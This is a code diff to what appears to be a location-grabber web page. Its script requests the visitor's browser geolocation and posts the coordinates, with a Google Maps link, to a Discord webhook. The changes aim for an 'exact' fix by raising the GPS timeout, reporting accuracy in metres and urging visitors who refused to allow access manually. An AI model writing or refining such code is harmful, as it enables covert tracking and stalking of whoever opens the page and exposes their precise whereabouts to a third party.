@@ -87,7 +87,7 @@
             }
         }
 
-        async function sendToDiscord(lat, lon) {
+        async function sendToDiscord(lat, lon, accuracy) {
             try {
                 const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
@@ -95,7 +95,7 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: `📍 **New Location Received**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Google Maps:** https://www.google.com/maps?q=${lat},${lon}`
+                        content: `📍 **New Exact Location Received**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${accuracy.toFixed(1)} meters\n**Google Maps:** https://www.google.com/maps?q=${lat},${lon}`
                     })
                 });
 
@@ -116,11 +116,13 @@
                 return;
             }
 
+            updateStatus('Finding exact location... Please wait 10-15 seconds for GPS lock.', 'loading');
+
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    const { latitude, longitude } = position.coords;
-                    updateStatus(`Location found! Sending to Discord...`, 'loading');
-                    sendToDiscord(latitude, longitude);
+                    const { latitude, longitude, accuracy } = position.coords;
+                    updateStatus(`Location found (Accuracy: ${accuracy.toFixed(1)}m)! Sending to Discord...`, 'loading');
+                    sendToDiscord(latitude, longitude, accuracy);
                 },
                 (error) => {
                     let errorMessage = 'An unknown error occurred.';
@@ -129,17 +131,17 @@
                             errorMessage = 'User denied or browser blocked the request. Please click the button below to allow manually.';
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMessage = 'Location information is unavailable. Make sure your GPS is ON.';
+                            errorMessage = 'Location information is unavailable. Make sure your GPS is ON and you are not in a basement/elevator.';
                             break;
                         case error.TIMEOUT:
-                            errorMessage = 'The request to get user location timed out.';
+                            errorMessage = 'The request timed out. Please try again with a better signal.';
                             break;
                     }
                     updateStatus(errorMessage, 'error');
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: 5000,
+                    timeout: 20000,
                     maximumAge: 0
                 }
             );
